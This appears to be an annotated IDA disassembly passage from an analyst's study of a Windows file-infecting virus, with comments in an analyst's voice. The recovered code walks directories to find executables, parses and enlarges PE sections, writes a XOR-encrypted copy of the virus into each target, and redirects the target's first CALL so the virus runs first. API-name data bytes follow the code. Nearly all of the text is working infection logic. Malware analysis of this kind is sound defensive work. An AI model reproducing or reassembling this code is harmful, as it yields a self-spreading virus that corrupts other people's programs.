.data:00403364                                         ; checkFileName+34↑j
.data:00403364                 retn                    ; ret
.data:00403364 checkFileName   endp
.data:00403364
.data:00403365
.data:00403365 ; =============== S U B R O U T I N E =======================================
.data:00403365
.data:00403365
.data:00403365 recursivetraversal proc near            ; CODE XREF: sub_403014+2F4↑p
.data:00403365                                         ; recursivetraversal+97↓p
.data:00403365                 push    ebx             ; store  ebx on stack
.data:00403366                 mov     ebx, esp        ; store stack pointer in ebx for later
.data:00403368                 add     esp, 0FFFFFFF8h ; increment stack pointer by 0FFFFFFF8h to have a fresh stack?
.data:0040336B                 push    ebx             ; store original stack location
.data:0040336C                 push    13Eh            ; store  heap space size for  allocation
.data:00403371                 push    40h ; '@'       ; store 40h=>uFlags
.data:00403373                 mov     eax, ss:dword_40179F[ebp] ; [40179F+ ebp]->GlobalAlloc call address
.data:00403379                 call    eax             ; call "GlobalAlloc"
.data:00403379                                         ; Allocates the specified number of bytes (13eh) from the heap
.data:0040337B                 pop     ebx             ; restore original stack ptr
.data:0040337C                 mov     [ebx-8], eax    ; store in old stack the pointer to the heap object
.data:0040337F                 push    ebx             ; push old stack pointer
.data:00403380                 push    dword ptr [ebx-8] ; push the pointer to the heap object
.data:00403383                 lea     eax, byte_401BED[ebp] ; [ebp+401BEDh]=string "*.*"
.data:00403389                 push    eax             ; push string on stack as parameter
.data:0040338A                 mov     eax, ss:dword_4018BD[ebp] ; load FindFirstFile call addr
.data:00403390                 call    eax             ; call"FindFirstFile" that takes in file name  "*.*" and
.data:00403390                                         ;  return value is a search handle used in a subsequent call to FindNextFile or FindClose, and the lpFindFileData parameter contains information about the first file or directory found.
.data:00403392                 pop     ebx             ; ebx=pointer to the heap object
.data:00403393                 or      eax, eax        ;  test for a failed find of file and eax doesnt change
.data:00403395                 jnz     short fileFound ; if file is found then jump else continue
.data:00403397                 mov     eax, 0FFFFFFFFh ; set eax to abitrary value if file is not found instead of handle to file
.data:0040339C                 jmp     resetStackandReturn
.data:004033A1 ; ---------------------------------------------------------------------------
.data:004033A1
.data:004033A1 fileFound:                              ; CODE XREF: recursivetraversal+30↑j
.data:004033A1                 mov     [ebx-4], eax    ; store file handle in space under old stack ptr
.data:004033A4                 mov     eax, [ebx-8]    ; grab heap ptr
.data:004033A7                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; check if ptr + 2ch (first byte of filehandle) is equal to 2e
.data:004033AB                 jnz     short findNextFile ; if not equal then jump
.data:004033AD                 jmp     short $+2       ; else
.data:004033AF ; ---------------------------------------------------------------------------
.data:004033AF
.data:004033AF findNextFile:                           ; CODE XREF: recursivetraversal+46↑j
.data:004033AF                                         ; recursivetraversal+48↑j ...
.data:004033AF                 push    ebx             ; store old stack ptr on stack
.data:004033B0                 push    dword ptr [ebx-8] ; push heap object
.data:004033B3                 mov     eax, [ebx-4]    ; eax=findfile handler
.data:004033B6                 push    eax             ; push file handler as parameter
.data:004033B7                 mov     eax, ss:dword_4018E4[ebp] ; findNextFile for function call
.data:004033BD                 call    eax             ; call FindNextFile
.data:004033BD                                         ; the return value is nonzero and the lpFindFileData parameter contains information about the next file or directory found
.data:004033BF                 pop     ebx             ; restore old  stacck ptr
.data:004033C0                 or      eax, eax        ; check if function call was successful
.data:004033C2                 jnz     short getFileAttributes ; if call success then jump else return and exit
.data:004033C4                 mov     eax, 0FFFFFFFFh
.data:004033C9                 jmp     short resetStackandReturn
.data:004033CB ; ---------------------------------------------------------------------------
.data:004033CB
.data:004033CB getFileAttributes:                      ; CODE XREF: recursivetraversal+5D↑j
.data:004033CB                 mov     eax, [ebx-8]    ; eax=heap objecct having  file handle
.data:004033CE                 lea     ecx, [eax+2Ch]  ; ecx=ptr to file name
.data:004033D1                 push    ebx             ; store old stack ptr
.data:004033D2                 push    ecx             ; store filename on stack as parameter for function call
.data:004033D3                 mov     eax, ss:dword_4018D3[ebp] ; GetFileAttributesA function
.data:004033D9                 call    eax             ; call GetFileAttributesA function
.data:004033D9                                         ; the return value contains the attributes of the specified file or directory.
.data:004033DB                 pop     ebx             ; restore ebx
.data:004033DC                 cmp     eax, 10h        ; check if return value is 10h whihc corresponds to a return of The handle that identifies a directory.
.data:004033DF                 jnz     short notDirFound ; if it is a directory found ccontinue else jump
.data:004033E1                 mov     eax, [ebx-8]    ; get heap object
.data:004033E4                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; check if first byte of filename is 2eh
.data:004033E8                 jnz     short loc_4033EE ; ccertain hidden dir start with . so its trying to find hidden directories or avoid those directories
.data:004033E8                                         ; if . dir found then find anoter one else enter dir to infect files
.data:004033EA                 jmp     short findNextFile
.data:004033EC ; ---------------------------------------------------------------------------
.data:004033EC                 jmp     short loc_403412 ; jump to find next file
.data:004033EE ; ---------------------------------------------------------------------------
.data:004033EE
.data:004033EE loc_4033EE:                             ; CODE XREF: recursivetraversal+83↑j
.data:004033EE                 push    ebx             ; store stack  ptr
.data:004033EF                 lea     ecx, [eax+2Ch]  ; ecx=ptr to file name
.data:004033F2                 push    ecx             ; store dir name on stack for function call
.data:004033F3                 mov     eax, ss:dword_4017FD[ebp] ; SetCurrentDirectory function addr
.data:004033F9                 call    eax             ; call SetCurrentDirectory function
.data:004033F9                                         ; takes in The path to the new current directory which is just next file
.data:004033F9                                         ; essentially enters next dir
.data:004033FB                 pop     ebx             ; restore stack ptr
.data:004033FC                 call    recursivetraversal ; recursive loop to traverse through directories all the way down till base case is reached
.data:00403401                 push    ebx             ; when all the way down:
.data:00403401                                         ; store stack ptr
.data:00403402                 lea     ecx, byte_401BF1[ebp] ; [ebp+401BF1h]=".." and then push on stack as parameter
.data:00403408                 push    ecx
.data:00403409                 mov     eax, ss:dword_4017FD[ebp] ; call SetCurrentDirectory with path as ..
.data:00403409                                         ; Use two consecutive periods (..) as a directory component in a path to represent the parent of the current directory
.data:0040340F                 call    eax             ; this call is to exit out of dir
.data:00403411                 pop     ebx             ; restore ebx
.data:00403412
.data:00403412 loc_403412:                             ; CODE XREF: recursivetraversal+87↑j
.data:00403412                 jmp     short findNextFile
.data:00403414 ; ---------------------------------------------------------------------------
.data:00403414                 jmp     short loc_403435 ; jump to findnextfile
.data:00403416 ; ---------------------------------------------------------------------------
.data:00403416
.data:00403416 notDirFound:                            ; CODE XREF: recursivetraversal+7A↑j
.data:00403416                 push    ebx             ; if file is found (that is not dir)instead of dir which is the base case for the recursive call
.data:00403417                 mov     eax, [ebx-8]    ; grab file data
.data:0040341A                 pop     ebx             ; -_-
.data:0040341B                 lea     ecx, [eax+2Ch]  ; ecx=ptr file name
.data:0040341E                 mov     ss:dword_401C08[ebp], ecx ; store filename into mem at [ebp+401C08h]
.data:00403424                 call    checkFileName
.data:00403429                 cmp     eax, 1          ; is the file an executable? 1 for yes, 0 for no
.data:0040342C                 jnz     short loc_403435 ; if not then find another file if yest continue
.data:0040342E                 push    ebx             ; store ebx
.data:0040342F                 call    fileHandler
.data:00403434                 pop     ebx
.data:00403435
.data:00403435 loc_403435:                             ; CODE XREF: recursivetraversal+AF↑j
.data:00403435                                         ; recursivetraversal+C7↑j
.data:00403435                 jmp     findNextFile
.data:0040343A ; ---------------------------------------------------------------------------
.data:0040343A
.data:0040343A resetStackandReturn:                    ; CODE XREF: recursivetraversal+37↑j
.data:0040343A                                         ; recursivetraversal+64↑j
.data:0040343A                 mov     esp, ebx
.data:0040343C                 pop     ebx
.data:0040343D                 retn                    ; restore stack ptr and return
.data:0040343D recursivetraversal endp
.data:0040343D
.data:0040343E
.data:0040343E ; =============== S U B R O U T I N E =======================================
.data:0040343E
.data:0040343E
.data:0040343E fileHandler     proc near               ; CODE XREF: recursivetraversal+CA↑p
.data:0040343E                 push    0               ; A valid handle to a template file which is null
.data:00403440                 push    80h             ; file or device attributes and flags
.data:00403440                                         ; The file does not have other attributes set. This attribute is valid only if used alone.
.data:00403445                 push    4               ; An action to take on a file or device that exists or does not exist
.data:00403445                                         ; 4>Opens a file, always.
.data:00403447                 push    0               ; security attributes
.data:00403447                                         ;  the handle returned by CreateFile cannot be inherited by any child processes
.data:00403449                 push    3               ;  requested sharing mode of the file
.data:00403449                                         ;  3 indicates both read and write
.data:0040344B                 push    0C0000000h      ; desiredAccess parameter
.data:00403450                 mov     eax, ss:dword_401C08[ebp] ; push file name on stack as parameter
.data:00403456                 push    eax             ;  filename
.data:00403457                 mov     eax, ss:dword_4017BD[ebp] ; CreateFileA function
.data:00403457                                         ; the return value is an open handle to the specified file, device, named pipe, or mail slot
.data:0040345D                 call    eax
.data:0040345F                 mov     ss:dword_401BA9[ebp], eax ; store open handle in memory
.data:00403465                 cmp     eax, 0FFFFFFFFh ; ccheck for error
.data:00403468                 jnz     short fileMapping ; if no error jump
.data:0040346A                 mov     ebx, 1          ; else  ret
.data:0040346F                 retn
.data:00403470 ; ---------------------------------------------------------------------------
.data:00403470
.data:00403470 fileMapping:                            ; CODE XREF: fileHandler+2A↑j
.data:00403470                 xor     ebx, ebx        ; ebx=0
.data:00403472                 push    0
.data:00403474                 push    eax             ; store file create handle on stack with 0
.data:00403475                 mov     eax, ss:dword_4018AB[ebp]
.data:0040347B                 call    eax             ; call GetFileSize
.data:0040347B                                         ; the return value is the low-order doubleword of the file size
.data:0040347D                 add     eax, 0C31h      ; add 0C31h to the size (probably malicious stuff)
.data:00403482                 add     eax, 1000h      ; add 1000h to size
.data:00403487                 mov     ss:dword_401C0C[ebp], eax ; store new size in mem
.data:0040348D                 push    0               ; file mapping name as null
.data:0040348F                 mov     eax, ss:dword_401C0C[ebp]
.data:00403495                 push    eax             ; push calculated size
.data:00403496                 push    0               ; the high order bytes of the number for size of mapping
.data:00403498                 push    4               ; both read/write
.data:0040349A                 push    0               ; mapping can't be inherited by child processes
.data:0040349C                 mov     eax, ss:dword_401BA9[ebp] ; grab open file handle
.data:004034A2                 push    eax             ; pushes file handle as parameter
.data:004034A3                 mov     eax, ss:dword_4017D3[ebp]
.data:004034A9                 call    eax             ; CreateFileMapping
.data:004034A9                                         ; Creates or opens a named or unnamed file mapping object for a specified file.
.data:004034AB                 mov     ss:dword_401BAD[ebp], eax ; stores file mapping handle in memory
.data:004034B1                 push    ss:dword_401C0C[ebp] ; get file size of mapping
.data:004034B7                 push    0               ; low offset value zero
.data:004034B9                 push    0               ; high offset value zero
.data:004034BB                 push    2               ; A read/write view of the file is mapped
.data:004034BD                 mov     eax, ss:dword_401BAD[ebp]
.data:004034C3                 push    eax             ; handle to a file mapping object
.data:004034C4                 mov     eax, ss:dword_4017E5[ebp]
.data:004034CA                 call    eax             ; MapViewOfFile function
.data:004034CA                                         ; Maps a view of a file mapping into the address space of a calling process.
.data:004034CC                 mov     ss:dword_401BB1[ebp], eax ; stores the handle for the mapping into memory
.data:004034D2                 mov     edi, eax        ; edi=start of file mapping
.data:004034D4                 xor     eax, eax        ; eax=0
.data:004034D6                 mov     ax, [edi]       ; grab first byte of file and put it in ax
.data:004034D9                 add     edi, [edi+3Ch]  ; 3Ch offset into the executable
.data:004034D9                                         ; edi=offset of new exe
.data:004034DC                 add     edi, 4          ; increment cursor/ptr to not exe header?
.data:004034DF                 xor     ecx, ecx        ; ecx=0
.data:004034E1                 mov     cx, [edi+2]     ; cx=ceh which is the number of sections in the PE
.data:004034E5                 mov     ss:dword_401BC1[ebp], ecx ; store num of sections into mem
.data:004034EB                 add     edi, 14h        ; shift ptr to optional headers
.data:004034EE                 mov     ss:dword_401BC5[ebp], edi ; store ptr ptional header in memory
.data:004034F4                 mov     eax, [edi+40h]  ; eax=checksum
.data:004034F7                 cmp     eax, 0FFFFh     ; check if eax=-1
.data:004034FC                 jnz     short find_Text ; if equal close file and return else jump
.data:004034FE                 mov     eax, ss:dword_401BB1[ebp]
.data:00403504                 push    eax             ; push file mapping view handle as parameter as parameter
.data:00403505                 mov     eax, ss:dword_40187A[ebp]
.data:0040350B                 call    eax             ; call UnmapViewOfFile function
.data:0040350B                                         ; Unmaps a mapped view of a file from the calling process's address space.
.data:0040350D                 mov     eax, ss:dword_401BAD[ebp]
.data:00403513                 push    eax             ; push mapping file result pointer as parameter
.data:00403514                 mov     eax, ss:dword_40188A[ebp]
.data:0040351A                 call    eax             ; call CloseHandle function
.data:0040351A                                         ; Closes an open object handle.
.data:0040351C                 mov     eax, ss:dword_401BA9[ebp]
.data:00403522                 push    eax             ; push createfile handle ptr
.data:00403523                 mov     eax, ss:dword_40188A[ebp]
.data:00403529                 call    eax             ; Closes an open object handle.
.data:0040352B                 add     esp, 4          ; increment stack ptr
.data:0040352E                 retn                    ; return after closing all open handles
.data:0040352F ; ---------------------------------------------------------------------------
.data:0040352F
.data:0040352F find_Text:                              ; CODE XREF: fileHandler+BE↑j
.data:0040352F                 mov     eax, [edi+1Ch]  ; grab image base from  function call
.data:00403532                 mov     ss:dword_401BD1[ebp], eax ; store in mem
.data:00403538                 mov     eax, [edi+10h]  ; eax=start address
.data:0040353B                 mov     ss:dword_401BC9[ebp], eax ; store start address in memory
.data:00403541                 add     edi, 0E0h       ; moves the edi pointer to the start of the .text section header
.data:00403547                 mov     ss:dword_401C10[ebp], edi ; stores the .text pointer in memory
.data:0040354D                 mov     edi, ss:dword_401C10[ebp]
.data:00403553                 mov     ecx, ss:dword_401BC1[ebp] ; grabs the number of sections value from previous call previously stored in memory
.data:00403559                 mov     edx, 0          ; edx=0
.data:0040355E                 mov     ebx, 0          ; ebx=0
.data:00403563
.data:00403563 grabNextSection:                        ; CODE XREF: fileHandler+136↓j
.data:00403563                 or      ecx, ecx        ; update flags to check for if last section
.data:00403565                 jnz     short sectionHandler ; if num of sections is nonzero jump else...
.data:00403567                 jmp     short makingspaceforvirus ; all secctions have been traversed
.data:00403569 ; ---------------------------------------------------------------------------
.data:00403569
.data:00403569 sectionHandler:                         ; CODE XREF: fileHandler+127↑j
.data:00403569                 cmp     edx, [edi+14h]  ; is pointer of data null?
.data:0040356C                 jnb     short loc_403570 ; if it is then get next section
.data:0040356E                 mov     ebx, edi        ; else ebx=previous section with access ptr and actual data
.data:00403570
.data:00403570 loc_403570:                             ; CODE XREF: fileHandler+12E↑j
.data:00403570                 add     edi, 28h ; '('  ; move to next section
.data:00403573                 dec     ecx             ; reduce number of section left to go though
.data:00403573                                         ; essentially running through sections of exe file
.data:00403574                 jmp     short grabNextSection
.data:00403576 ; ---------------------------------------------------------------------------
.data:00403576
.data:00403576 makingspaceforvirus:                    ; CODE XREF: fileHandler+129↑j
.data:00403576                 mov     edi, ebx        ; set edi to the base of the last section
.data:00403578                 mov     eax, ss:dword_401BC5[ebp] ; grab pointer to the optional image header
.data:0040357E                 mov     ebx, [eax+24h]  ; grabs the file alignment offset and store in memory
.data:00403581                 mov     ss:dword_401BD9[ebp], ebx
.data:00403587                 mov     ebx, [eax+20h]  ; grab section alignment and store in memory
.data:0040358A                 mov     ss:dword_401BDD[ebp], ebx
.data:00403590                 mov     eax, ss:dword_401BB1[ebp] ; eax=pointer to the mapping view
.data:00403596                 add     eax, [edi+14h]  ; pointer to the mapping view+offset into this section's start
.data:00403599                 add     eax, [edi+8]    ; ...+the number of bytes actually in use
.data:00403599                                         ; move pointer to  beginnning of unused space
.data:0040359C                 mov     ss:dword_40175F[ebp], eax ; move pointer into memory
.data:004035A2                 mov     eax, [edi+0Ch]  ; eax=offset from the Virtual base address  or RVA of the section
.data:004035A5                 add     eax, [edi+8]    ; ...+num of bytes in use
.data:004035A8                 mov     ss:dword_401763[ebp], eax ; store value that is the offset from the base address to the beginning of the unused data  in mem
.data:004035AE                 mov     eax, [edi+8]    ; eax=size of used space
.data:004035B1                 add     eax, 0C31h      ; add size of packed malware
.data:004035B6                 add     eax, 65h ; 'e'  ; ...+size of unpacking algorithm
.data:004035BB                 mov     [edi+8], eax    ; store it back as new size
.data:004035BE                 push    edi             ; pushes the pointer to the base of the target header to the stack
.data:004035BF                 mov     edi, ss:dword_401BC5[ebp] ; grabs file alignment offset
.data:004035C5                 mov     eax, [edi+38h]  ; getimage size...
.data:004035C8                 add     eax, 0C31h      ; ...+the packed size
.data:004035CD                 add     eax, 65h ; 'e'  ; ...+ the unpacking algorithm size
.data:004035D2                 pop     edi             ; restores edi
.data:004035D3                 mov     eax, [edi+10h]  ; eax=size of raw data in section
.data:004035D6                 add     eax, 0C31h      ; ...+size of packed malware
.data:004035DB                 add     eax, 65h ; 'e'  ; ...+size of unpacking algorithm
.data:004035E0                 push    eax             ; push new value to stack
.data:004035E1                 xor     edx, edx        ; edx=0
.data:004035E3                 mov     ebx, ss:dword_401BD9[ebp] ; ebx=file alignment...
.data:004035E9                 div     ebx             ; ... divided by malware by the file alignment
.data:004035EB                 pop     edx             ; edx = new value of size of raw data in section
.data:004035EC                 add     eax, edx        ; ...+ new value of size of the raw section (with malware and algorithm)
.data:004035EE                 mov     [edi+10h], eax  ; overwrites with new size of raw data including the malware
.data:004035F1                 mov     edi, ss:dword_40175F[ebp] ; moves pointer to start of unused section
.data:004035F7                 mov     esi, offset start ; moves esi register to point to entry point of current executable
.data:004035FC                 add     esi, ebp        ; adds the offset between the entry point and the start of the malware
.data:004035FE                 mov     ecx, 0C31h      ; ecx= size of packed malware for  the movsb
.data:00403603                 mov     ecx, 61h ; 'a'
.data:00403608                 rep movsb               ; copies the first 61h bytes of the malware
.data:0040360A                 mov     eax, ss:dword_401BE5[ebp] ; gets the return  GetTickCount function call
.data:00403610                 stosd                   ; writes that dword where the string copy left off
.data:00403611                 add     esi, 4          ; adds 4 to esi from after stods
.data:00403614                 mov     ecx, 0C31h      ; grab the 0c31h of unpacked malware
.data:00403619
.data:00403619 repacking:                              ; CODE XREF: fileHandler+214↓j
.data:00403619                 lodsb                   ; get unpacked  malware
.data:0040361A                 push    eax             ; following lines are essentially packing algorithm
.data:0040361B                 push    ecx
.data:0040361C                 mov     eax, ss:dword_401BE5[ebp]
.data:00403622                 xor     edx, edx
.data:00403624                 mov     ecx, 1F31Dh
.data:00403629                 div     ecx
.data:0040362B                 mov     ecx, eax
.data:0040362D                 mov     eax, 41A7h
.data:00403632                 mul     edx
.data:00403634                 mov     edx, ecx
.data:00403636                 mov     ecx, eax
.data:00403638                 mov     eax, 0B14h
.data:0040363D                 mul     edx
.data:0040363F                 sub     ecx, eax
.data:00403641                 xor     edx, edx
.data:00403643                 mov     eax, ecx
.data:00403645                 mov     ss:dword_401BE5[ebp], ecx
.data:0040364B                 mov     edx, eax
.data:0040364D                 pop     ecx
.data:0040364E                 pop     eax
.data:0040364F                 xor     al, dl
.data:00403651                 stosb                   ; write packed bytes to target exe unused created section
.data:00403652                 loop    repacking       ; end of packing algorithm
.data:00403654                 mov     ss:dword_40176B[ebp], edi ; store end of malware address to memory
.data:0040365A                 mov     edi, ss:dword_401C10[ebp]
.data:00403660                 mov     ecx, ss:dword_401BC1[ebp] ; grab both number of sections (ecx) and text header section pointer
.data:00403666
.data:00403666 checkifSection:                         ; CODE XREF: fileHandler+252↓j
.data:00403666                 or      ecx, ecx        ; checck if number of sections is 0
.data:00403668                 jnz     short loc_40366F ; jumps if ecx isn't zero else
.data:0040366A                 or      edi, 0FFFFFFFFh ; section searcched for is found
.data:0040366D                 jmp     short sectionFound
.data:0040366F ; ---------------------------------------------------------------------------
.data:0040366F
.data:0040366F loc_40366F:                             ; CODE XREF: fileHandler+22A↑j
.data:0040366F                 mov     eax, ss:dword_401BC9[ebp] ; begin at start address
.data:00403675                 cmp     eax, [edi+0Ch]  ; check if the start address is less than the header's RVA
.data:00403678                 jb      short loc_40368C
.data:0040367A                 mov     ebx, [edi+0Ch]  ; get header RVA...
.data:0040367D                 add     ebx, [edi+8]    ; ...+ the section's virtual size
.data:00403680                 cmp     eax, ebx        ; check if the start address is greater than that new sum
.data:00403682                 jnb     short loc_40368C
.data:00403684                 mov     ss:dword_401BD5[ebp], edi ; store the section header address at value of the image base
.data:0040368A                 jmp     short sectionFound
.data:0040368C ; ---------------------------------------------------------------------------
.data:0040368C
.data:0040368C loc_40368C:                             ; CODE XREF: fileHandler+23A↑j
.data:0040368C                                         ; fileHandler+244↑j
.data:0040368C                 dec     ecx             ; decrement count of sections
.data:0040368D                 add     edi, 28h ; '('  ; move the pointer to the next section
.data:00403690                 jmp     short checkifSection
.data:00403692 ; ---------------------------------------------------------------------------
.data:00403692
.data:00403692 sectionFound:                           ; CODE XREF: fileHandler+22F↑j
.data:00403692                                         ; fileHandler+24C↑j
.data:00403692                 mov     ecx, [edi+10h]  ; ecx=size of data
.data:00403695                 mov     eax, [edi+14h]  ; eax=size of data
.data:00403698                 push    eax             ; store eax  on stack
.data:00403699                 mov     eax, [edi+0Ch]  ; eax= section RVA...
.data:0040369C                 add     eax, ss:dword_401BD1[ebp] ; ...+ image base...
.data:004036A2                 sub     eax, [edi+14h]  ; ...-pointer to the raw data...
.data:004036A5                 sub     eax, ss:dword_401BB1[ebp] ; ...-image base?
.data:004036AB                 mov     ss:dword_401767[ebp], eax ; store value in memory
.data:004036B1                 pop     eax             ; restore pointer to raw  data
.data:004036B2                 add     eax, ss:dword_401BB1[ebp] ; ...+image base
.data:004036B8                 mov     ss:dword_401BCD[ebp], eax ; store value in memory
.data:004036BE                 mov     edi, eax        ; edi=calculated address
.data:004036C0                 xor     eax, eax        ; eax=0
.data:004036C2                 mov     al, 0E8h        ; 0e8->opcode for call??
.data:004036C4                 repne scasb             ; it is searching of 0e8h which means searching for appearance of call in exe?
.data:004036C6                 dec     edi             ; get byte right before first instance of call
.data:004036C7                 add     ss:dword_401767[ebp], edi ; stores that pointer in memory
.data:004036C7                                         ; this section makes it so malware  does it thing right before first instance of a call
.data:004036CD                 inc     edi             ; go back to pointing at call
.data:004036CE                 mov     esi, edi        ; sets esi to point at the first CALL instruction
.data:004036D0                 lodsd                   ; loads the dword starting there, ecx bytes which is currently size of raw data
.data:004036D1                 mov     edx, ss:dword_40176B[ebp] ; edx=final address of malware
.data:004036D7                 mov     ss:dword_40176B[ebp], eax ; store call  instruction right after malware
.data:004036DD                 mov     eax, ss:dword_401763[ebp] ; eax=offset to start of section's  unused data space...
.data:004036E3                 add     eax, ss:dword_401BD1[ebp] ; ...+image base...
.data:004036E9                 sub     eax, ss:dword_401767[ebp] ; ...-address  before call
.data:004036EF                 sub     eax, 5          ; ...-5  for the distance between opcode
.data:004036EF                                         ; call should transition to malware seemlessly(sp?) with the same instruction
.data:004036F2                 stosd
.data:004036F3                 push    edi
.data:004036F4                 mov     eax, ss:dword_401767[ebp] ; get address of call
.data:004036FA                 add     eax, ss:dword_40176B[ebp] ; ...+the operand of that CALL instruction to the instruction's memory location
.data:00403700                 add     eax, 5          ; ...+5
.data:00403703                 mov     ss:dword_40176B[ebp], eax ; store eax which is the memory location the exe would've jumped to if the CALL wasn't infected
.data:00403703                                         ; so malware at call and then immediately actual real call
.data:00403709                 pop     edi             ; pointer to the first call
.data:0040370A                 mov     edi, edx        ; edi=final location of malware
.data:0040370C                 push    eax             ; push on stack final location of first call
.data:0040370D                 mov     al, 68h ; 'h'   ; grab opcode for pushi
.data:0040370F                 stosb                   ; write it to exe file
.data:00403710                 pop     eax
.data:00403711                 stosd                   ; writes the original call destination to the end of the exe
.data:00403712                 mov     al, 0C3h        ; write final return which pop the first value off the stack (the initial call intruction) into eip
.data:00403714                 stosb
.data:00403715
.data:00403715 isdivisibleby11:                        ; CODE XREF: fileHandler+2E9↓j
.data:00403715                 call    randomNumGen
.data:0040371A                 mov     ebx, 0Bh
.data:0040371F                 div     ebx             ; divide the result of pseudo rando by 0bh
.data:00403721                 cmp     edx, 0          ; check if result divisible by 11?
.data:00403724                 jz      short close
.data:00403726                 stosd                   ; write result of the random number generator to the end of the malware copy
.data:00403727                 jmp     short isdivisibleby11 ; repeat this until divisible by 11?
.data:00403727                                         ; but why?
.data:00403729 ; ---------------------------------------------------------------------------
.data:00403729
.data:00403729 close:                                  ; CODE XREF: fileHandler+2E6↑j
.data:00403729                 mov     eax, ss:dword_401BB1[ebp]
.data:0040372F                 push    eax             ; push mapping view handle as parameter
.data:00403730                 mov     eax, ss:dword_40187A[ebp]
.data:00403736                 call    eax             ; call UnmapViewOfFile function
.data:00403738                 mov     eax, ss:dword_401BAD[ebp]
.data:0040373E                 push    eax             ; push MappingFileResult handle as  parameter
.data:0040373F                 mov     eax, ss:dword_40188A[ebp]
.data:00403745                 call    eax             ; call CloseHandle
.data:00403747                 mov     eax, ss:dword_401BA9[ebp]
.data:0040374D                 push    eax             ; push CreateFileA as parameter to close
.data:0040374E                 mov     eax, ss:dword_40188A[ebp]
.data:00403754                 call    eax             ; close file handle return and continue doing this to other files
.data:00403756                 retn
.data:00403756 fileHandler     endp
.data:00403756
.data:00403756 ; ---------------------------------------------------------------------------
.data:00403757                 db    0
.data:00403758                 db    0
.data:00403759                 db    0
.data:0040375A                 db    0
.data:0040375B                 db    0
.data:0040375C                 db    0
.data:0040375D                 db    0
.data:0040375E                 db    0
.data:0040375F                 db    0
.data:00403760                 db    0
.data:00403761                 db    0
.data:00403762                 db    0
.data:00403763                 db    0
.data:00403764                 db    0
.data:00403765                 db    0
.data:00403766                 db    0
.data:00403767                 db    0
.data:00403768                 db    0
.data:00403769                 db    0
.data:0040376A                 db    0
.data:0040376B                 db    0
.data:0040376C                 db    0
.data:0040376D                 db    0
.data:0040376E                 db    0
.data:0040376F                 db    0
.data:00403770                 db    0
.data:00403771                 db    0
.data:00403772                 db    0
.data:00403773                 db  14h
.data:00403774                 db    8
.data:00403775                 db  33h ; 3
.data:00403776                 db    0
.data:00403777                 db  14h
.data:00403778                 db  30h ; 0
.data:00403779                 db    0
.data:0040377A                 db    0
.data:0040377B                 db  0Eh
.data:0040377C                 db  10h
.data:0040377D                 db  40h ; @
.data:0040377E                 db    0
.data:0040377F                 db  1Ah
.data:00403780                 db  10h
.data:00403781                 db  40h ; @
.data:00403782                 db    0
.data:00403783                 db    0
.data:00403784                 db  4Ch ; L
.data:00403785                 db  6Fh ; o
.data:00403786                 db  61h ; a
.data:00403787                 db  64h ; d
.data:00403788                 db  4Ch ; L
.data:00403789                 db  69h ; i
.data:0040378A                 db  62h ; b
.data:0040378B                 db  72h ; r
.data:0040378C                 db  61h ; a
.data:0040378D                 db  72h ; r
.data:0040378E                 db  79h ; y
.data:0040378F                 db    0
.data:00403790                 db  9Ch
.data:00403791                 db  4Fh ; O
.data:00403792                 db  88h
.data:00403793                 db  7Ch ; |
.data:00403794                 db  47h ; G
.data:00403795                 db  65h ; e
.data:00403796                 db  74h ; t
.data:00403797                 db  50h ; P
.data:00403798                 db  72h ; r
.data:00403799                 db  6Fh ; o
.data:0040379A                 db  63h ; c
.data:0040379B                 db  41h ; A
.data:0040379C                 db  64h ; d
.data:0040379D                 db  64h ; d
.data:0040379E                 db  72h ; r
.data:0040379F                 db  65h ; e
.data:004037A0                 db  73h ; s
.data:004037A1                 db  73h ; s
.data:004037A2                 db    0
.data:004037A3                 db    0
.data:004037A4                 db    0
.data:004037A5                 db    0
.data:004037A6                 db    0
.data:004037A7                 db  47h ; G
.data:004037A8                 db  6Ch ; l
.data:004037A9                 db  6Fh ; o
.data:004037AA                 db  62h ; b
.data:004037AB                 db  61h ; a
.data:004037AC                 db  6Ch ; l
.data:004037AD                 db  41h ; A
.data:004037AE                 db  6Ch ; l
.data:004037AF                 db  6Ch ; l
.data:004037B0                 db  6Fh ; o
.data:004037B1                 db  63h ; c
.data:004037B2                 db    0
.data:004037B3                 db 0CDh
.data:004037B4                 db 0FDh
.data:004037B5                 db  80h
.data:004037B6                 db  7Ch ; |
.data:004037B7                 db  47h ; G
.data:004037B8                 db  6Ch ; l
.data:004037B9                 db  6Fh ; o
.data:004037BA                 db  62h ; b
.data:004037BB                 db  61h ; a
.data:004037BC                 db  6Ch ; l
.data:004037BD                 db  46h ; F
.data:004037BE                 db  72h ; r
.data:004037BF                 db  65h ; e
.data:004037C0                 db  65h ; e
.data:004037C1                 db    0
.data:004037C2                 db 0CFh
.data:004037C3                 db 0FCh
.data:004037C4                 db  80h
.data:004037C5                 db  7Ch ; |
.data:004037C6                 db  43h ; C
.data:004037C7                 db  72h ; r
.data:004037C8                 db  65h ; e
.data:004037C9                 db  61h ; a
.data:004037CA                 db  74h ; t
.data:004037CB                 db  65h ; e
.data:004037CC                 db  46h ; F
.data:004037CD                 db  69h ; i
.data:004037CE                 db  6Ch ; l
.data:004037CF                 db  65h ; e
.data:004037D0                 db    0
.data:004037D1                 db  28h ; (
.data:004037D2                 db  1Ah
.data:004037D3                 db  80h
.data:004037D4                 db  7Ch ; |
.data:004037D5                 db  43h ; C
.data:004037D6                 db  72h ; r
.data:004037D7                 db  65h ; e
.data:004037D8                 db  61h ; a
.data:004037D9                 db  74h ; t
.data:004037DA                 db  65h ; e
.data:004037DB                 db  46h ; F
.data:004037DC                 db  69h ; i
.data:004037DD                 db  6Ch ; l
.data:004037DE                 db  65h ; e
.data:004037DF                 db  4Dh ; M
.data:004037E0                 db  61h ; a
.data:004037E1                 db  70h ; p
.data:004037E2                 db  70h ; p
.data:004037E3                 db  69h ; i
.data:004037E4                 db  6Eh ; n
.data:004037E5                 db  67h ; g
.data:004037E6                 db    0
.data:004037E7                 db  0Ah
.data:004037E8                 db  95h
.data:004037E9                 db  80h
.data:004037EA                 db  7Ch ; |
.data:004037EB                 db  4Dh ; M
.data:004037EC                 db  61h ; a
.data:004037ED                 db  70h ; p
.data:004037EE                 db  56h ; V
.data:004037EF                 db  69h ; i
.data:004037F0                 db  65h ; e
.data:004037F1                 db  77h ; w
.data:004037F2                 db  4Fh ; O
.data:004037F3                 db  66h ; f
.data:004037F4                 db  46h ; F
.data:004037F5                 db  69h ; i
.data:004037F6                 db  6Ch ; l
.data:004037F7                 db  65h ; e
.data:004037F8                 db    0
.data:004037F9                 db 0A5h
